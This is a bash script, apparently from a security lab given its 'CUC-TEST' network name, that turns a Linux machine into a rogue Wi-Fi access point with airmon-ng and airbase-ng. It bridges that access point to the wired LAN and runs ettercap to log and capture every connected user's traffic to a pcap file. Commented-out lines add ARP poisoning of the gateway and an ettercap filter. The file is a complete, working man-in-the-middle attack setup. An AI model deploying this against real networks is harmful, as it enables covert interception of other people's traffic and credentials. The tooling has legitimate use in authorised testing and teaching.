#!/bin/bash


function get_if() {
if_prefix="${1}"
if_postfix="${2}"
i=0
max_i=10
for((i=0;i<${max_i};i++));do
  if [[ -z "${if_postfix}" ]];then
    ifconfig "${if_prefix}${i}" >/dev/null 2>&1
  else
    ifconfig "${if_prefix}${i}${if_postfix}" >/dev/null 2>&1
  fi

  if [[ $? -eq 0 ]];then
    if [[ -z "${if_postfix}" ]];then
      echo -n "${if_prefix}${i}"
    else
      echo -n "${if_prefix}${i}${if_postfix}"
    fi
    return 0
  fi
done

return 1
}

function get_eth_if() {
ret_msg=$(get_if "eth")
ret_code=$?
echo -n "$ret_msg"
return $ret_code
}

function get_wlan_if() {
ret_msg=$(get_if "wlan")
ret_code=$?
echo -n "$ret_msg"
return $ret_code
}

function get_at_if() {
ret_msg=$(get_if "at")
ret_code=$?
echo -n "$ret_msg"
return $ret_code
}

[[ ${UID} -eq 0 ]] || {
echo "you need to run this script with ROOT privilege"
exit 1
}

[[ -x $(which brctl) ]] || {
apt-get update && apt-get install bridge-utils -y
}

[[ -x $(which airmon-ng) ]] || {
  echo "aircrack-ng is needed to run this script"
  exit 1
}

channel=11
essid="CUC-TEST"
wlan_if=$(get_wlan_if)
if [[ $? -eq 1 ]];then
  wlan_mon_if=$(get_if "wlan" "mon")
else
  wlan_mon_if="${wlan_if}mon"  
fi
mitm_if="mitm"
pcap_dump="/tmp/ettercap_$(date +%Y-%m-%d_%H-%M-%S).pcap"
lan_if=$(get_eth_if)

ifconfig ${wlan_if} up
iw dev ${wlan_mon_if} info
if [[ $? -eq 0 ]];then
  echo "${wlan_mon_if} is up, resume"
else
  # 关闭可能会影响airmon-ng工具稳定性的进程
  airmon-ng check kill
  # 开启网卡的监听模式
  airmon-ng start ${wlan_if}
fi

ifconfig ${wlan_mon_if} down
iwconfig ${wlan_mon_if} mode monitor
iwconfig ${wlan_mon_if} channel ${channel}
ifconfig ${wlan_mon_if} up

at_if=$(get_at_if)
if [[ $? -eq 0 ]];then
  echo "${at_if} is there, resume"
else
  killall airbase-ng
  nohup airbase-ng -c ${channel} --essid ${essid} ${wlan_mon_if} 2>&1 >>/tmp/airbase-ng.log &
  at_if_na=1
  while [[ $at_if_na -eq 1 ]];do
    sleep 1
    at_if=$(get_at_if)
    at_if_na=$?
  done
fi

ifconfig ${at_if} up

ifconfig ${mitm_if}
if [[ $? -eq 0 ]];then
  echo "${mitm_if} is there, resume"
else
  brctl addbr ${mitm_if}
fi

if [[ $(brctl show ${mitm_if} | grep -c ${lan_if}) -eq 0 ]];then
  brctl addif ${mitm_if} ${lan_if}
fi

if [[ $(brctl show ${mitm_if} | grep -c ${at_if}) -eq 0 ]];then
  brctl addif ${mitm_if} ${at_if}
fi

ifconfig ${lan_if} 0.0.0.0 up
ifconfig ${at_if} 0.0.0.0 up
ifconfig ${mitm_if} up
dhclient ${mitm_if}
ifconfig ${mitm_if}

#if [[ -x $(which traceroute) ]];then
#  traceroute="$(which traceroute) -m 1"
#else
#  traceroute="$(which tracepath) -m 1"
#fi
#
#test_dst_ip="114.114.114.114"
ettercap_log="/tmp/ettercap.log"
#
#GW_IP=$(${traceroute} ${test_dst_ip} | grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])' | grep -v ${test_dst_ip} | head -n1)
#
#
#[[ -x $(which ettercap) ]] && {
#etterfilter etter.filter.alert -o etter.filter.alert.ef
##ettercap -i ${mitm_if} -Tq  -m ${ettercap_log} -F etter.filter.alert.ef -w ${pcap_dump} -M arp:remote /${GW_IP}/ // 
#ettercap -i ${mitm_if} -Tq  -m ${ettercap_log} -F etter.filter.alert.ef -w ${pcap_dump}
ettercap -i ${mitm_if} -Tq  -m ${ettercap_log} -w ${pcap_dump}
#}

#tcpdump -i ${mitm_if} -w ${pcap_dump}

